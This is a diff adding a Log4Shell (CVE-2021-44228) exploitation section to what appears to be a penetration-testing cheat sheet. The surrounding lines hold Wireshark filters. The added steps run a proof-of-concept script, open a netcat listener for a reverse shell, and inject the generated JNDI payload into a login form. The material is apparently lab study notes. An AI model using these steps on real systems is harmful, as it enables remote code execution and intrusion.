@@ -366,3 +366,22 @@ cp /root/Desktop/filename /var/www/html/share/
 
 To find DOS (SYN and ACK) : tcp.flags.syn == 1  , tcp.flags.syn == 1 and tcp.flags.ack == 0
 To find passwords : http.request.method == POST
+
+## Log4j-shell-poc
+Log4j is an open-source framework that helps developers store various types of logs produced by users. Log4j which is also known as Log4shell and LogJam is a zero-day RCE (Remote Code Execution) vulnerability, tracked under CVE-2021–44228. Log4j enables insecure JNDI lookups, when these JNDI lookups are paired with the LDAP protocol, can be exploited to exfiltrate data or execute arbitrary code.
+
+  ```console
+tar -xf jdk-8u202-linux-x64.tar.gz
+mv jdk1.8.0_202 /usr/bin/
+pluma poc.py
+line62, replace jdk1.8.0_20/bin/javac with /usr/bin/jdk1.8.0_202/bin/java
+line 87 and replace jdk1.8.0_20/bin/java with /usr/bin/jdk1.8.0_202/bin/java
+line 99 and replace jdk1.8.0_20/bin/java with /usr/bin/jdk1.8.0_202/bin/java
+python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001
+nc -lvp 9001
+  ```
+* copy the payload generated in the send me: section
+* On vulnerable website login page in Username field paste the payload that was copied in previous step and in Password field type password and press Login button as shown in the screenshot.
+In the Password field you can enter any password.
+
+
